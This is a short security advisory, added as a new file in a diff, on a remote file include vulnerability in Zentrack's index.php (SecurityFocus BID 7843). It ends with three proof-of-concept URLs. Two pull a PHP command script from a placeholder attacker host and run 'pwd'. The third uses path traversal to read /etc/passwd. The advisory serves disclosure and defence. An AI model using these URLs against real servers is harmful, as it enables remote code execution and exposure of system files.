@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/7843/info
+
+A remote file include vulnerability has been reported for Zentrack. Due to insufficient sanitization of some user-supplied variables by the 'index.php' script, it is possible for a remote attacker to include a malicious PHP file in a URL.
+
+If the remote file is a malicious PHP script, this may allow for the execution of attacker-supplied PHP code with the privileges of the web server. Successful exploitation may provide unauthorized remote access to the attacker. This issue may also be exploited to remotely view files on the vulnerable host.
+
+http://www.example.com/zentrack/index.php?configFile=http://[attacker]/cmd.php?
+cmd=pwd
+
+http://www.example.com/zentrack/www/index.php?libDir=http://
+[attacker]/test/&cmd=pwd
+
+http://www.exmaple.com/zentrack/index.php?configFile=/../../../../../etc/passwd 
